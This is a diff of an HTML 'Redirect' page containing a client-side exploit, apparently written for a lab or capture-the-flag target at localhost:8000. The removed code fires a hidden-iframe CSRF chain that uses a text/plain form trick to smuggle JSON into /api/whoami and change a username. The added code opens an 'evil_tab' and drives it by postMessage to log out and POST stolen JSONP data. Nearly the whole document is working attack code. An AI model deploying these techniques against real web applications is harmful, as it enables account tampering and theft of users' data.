@@ -4,49 +4,39 @@
   <title>Redirect</title>
 </head>
 <body>
-  <script>
-    function exploit(data) {
-      // Ждем 3 секунды перед началом
-      document.body.innerHTML = '<h1>Starting in 3 seconds...</h1>';
+<script>
+    function runSequence(tab, secretData) {
+        const targetOrigin = 'http://localhost:8000';
 
-      setTimeout(() => {
-        // Шаг 1: GET запрос на http://localhost:8000/#/sheets через iframe
-        const iframe1 = document.createElement('iframe');
-        iframe1.style.display = 'none';
-        iframe1.src = 'http://localhost:8000/#/sheets';
-        document.body.appendChild(iframe1);
+        tab.postMessage({ action: 'FETCH', method: 'GET', path: '/#/sheets' }, targetOrigin);
 
         setTimeout(() => {
-          // Шаг 2: POST запрос через форму в iframe
-          const iframe2 = document.createElement('iframe');
-          iframe2.name = 'postFrame';
-          iframe2.style.display = 'none';
-          document.body.appendChild(iframe2);
-
-          const form = document.createElement('form');
-          form.method = 'POST';
-          form.action = 'http://localhost:8000/api/whoami';
-          form.target = 'postFrame';
-          form.enctype = 'text/plain';
-
-          const input = document.createElement('input');
-          input.type = 'hidden';
-          input.name = '{"new_username":"wild';
-          input.value = 'spruce"}';
-          form.appendChild(input);
-
-          document.body.appendChild(form);
-          form.submit();
-
-          setTimeout(() => {
-            // Шаг 3: GET запрос на http://localhost:8000/#/settings через iframe
-            const iframe3 = document.createElement('iframe');
-            iframe3.style.display = 'none';
-            iframe3.src = 'http://localhost:8000/#/settings';
-            document.body.appendChild(iframe3);
-          }, 1000);
+            tab.postMessage({ action: 'FETCH', method: 'GET', path: '/api/logout' }, targetOrigin);
         }, 1000);
-      }, 3000);
+
+        setTimeout(() => {
+            tab.postMessage({
+                action: 'FETCH',
+                method: 'POST',
+                path: '/api/whoami',
+                payload: { data: secretData }
+            }, targetOrigin);
+        }, 1000);
+
+        setTimeout(() => {
+            tab.postMessage({ action: 'FETCH', method: 'GET', path: '/#/settings' }, targetOrigin);
+        }, 2000);
+    }
+
+    function exploit(data) {
+        console.log("JSONP data:", data);
+
+        const svelteTab = window.open('http://localhost:8000', 'evil_tab');
+
+        setTimeout(() => {
+            console.log('Run Sequence...');
+            runSequence(svelteTab, data);
+        }, 3000);
     }
   </script>
 
